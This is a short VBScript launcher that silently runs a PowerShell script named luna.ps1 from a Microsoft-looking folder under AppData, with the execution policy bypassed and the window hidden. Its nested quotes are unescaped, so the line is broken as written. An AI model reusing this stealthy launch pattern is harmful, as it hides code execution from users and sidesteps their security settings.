Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%APPDATA%\Microsoft\Windows\luna\luna.ps1"", 0, False